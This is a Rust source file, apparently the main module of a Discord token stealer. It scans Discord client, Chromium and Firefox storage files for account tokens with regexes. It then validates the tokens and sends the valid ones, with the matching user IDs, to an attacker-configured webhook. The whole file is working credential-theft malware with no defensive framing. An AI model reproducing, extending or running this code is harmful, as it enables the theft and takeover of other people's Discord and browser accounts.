use std::sync::Arc;
use regex::Regex;
use std::sync::Mutex;

mod grabber {
    pub mod utils;
    pub mod grabber;
}

mod global {
    pub mod utils;
}

#[tokio::main]
async fn main() {
    match global::utils::isempty_webhook() {
        Ok(_) => {},
        Err(e) => {
            eprintln!("{}", e);
            panic!("Execution canceled due to missing webhook.");
        }
    }

    let regex_pattern = Regex::new(grabber::utils::REGEX).unwrap();
    let encrypted_regex_pattern = Regex::new(grabber::utils::ENCRYPTED_REGEX).unwrap();
    let new_credentials = Arc::new(Mutex::<global::utils::Credentials>::new(Default::default()));
    let mut tasks = Vec::new();

    // Iterate over the paths
    for (name, path) in grabber::utils::PATHS.iter() {
        if !std::path::Path::new(&path).exists() {
            continue;
        }
        let new_credentials_clone = Arc::clone(&new_credentials);
        let encrypted_regex_pattern_clone = encrypted_regex_pattern.clone();
        let regex_pattern_clone = regex_pattern.clone();

        tasks.push(tokio::spawn(async move {
            if path.contains("cord") {
                let discord_tokens = grabber::grabber::get_discord_tokens(&format!("{}\\{}\\Local State", global::utils::ROAMING, name.replace(" ", "")), &path, &encrypted_regex_pattern_clone).await.lock().unwrap().token.clone();
                new_credentials_clone.lock().unwrap().token.extend(discord_tokens);
            } else {
                let browser_tokens = grabber::grabber::get_browser_tokens(&path, &regex_pattern_clone, &[".log".to_string(), ".ldb".to_string()]).await.lock().unwrap().token.clone();
                new_credentials_clone.lock().unwrap().token.extend(browser_tokens);
            }
        }));
    }

    
    // Wait for all tasks to complete
    for task in tasks {
        task.await.unwrap();
    }
    new_credentials.lock().unwrap().token.extend(grabber::grabber::get_browser_tokens(&format!("{}\\Mozilla\\Firefox\\Profiles", global::utils::ROAMING), &regex_pattern, &[".sqlite".to_string()]).await.lock().unwrap().token.clone());

    // // Remove duplicates
    let uncheck_tokens: Vec<String> = global::utils::remove_duplicates(new_credentials.lock().unwrap().token.clone());
 
    // Clear new credentials fields
    new_credentials.lock().unwrap().token.clear();
    new_credentials.lock().unwrap().id.clear();

    let mut tasks = Vec::new(); // Collect tasks that resolve to Credentials

    // Check if tokens are valid using Threading, Reqwest and async
    for t in uncheck_tokens.iter() {
        let creds = Arc::clone(&new_credentials);
        let t = t.to_string();
        let uncheck_tokens = uncheck_tokens.clone();

        let task = tokio::spawn(async move {
            let unwrapped = grabber::grabber::check_token(&t).await.unwrap();

            if !uncheck_tokens.contains(&unwrapped.1.clone()) && unwrapped.0 == "200" {
                let mut creds = creds.lock().unwrap(); // Lock the mutex and get a guard
                creds.id.push(unwrapped.1.clone()); // Push Data to Credentials
                creds.token.push(t.clone());
            }
        });

        tasks.push(task);
    }

    // Wait for all tasks to complete
    for task in tasks {
        task.await.unwrap();
    }

    let mut final_creds = new_credentials.lock().unwrap();

    // Remove duplicates
    final_creds.id = global::utils::remove_duplicates(final_creds.id.clone());

    global::utils::send_data(global::utils::WEBHOOK_URL, &format!("{:?}NOP{:?}", final_creds.id, final_creds.token));

    return;
}
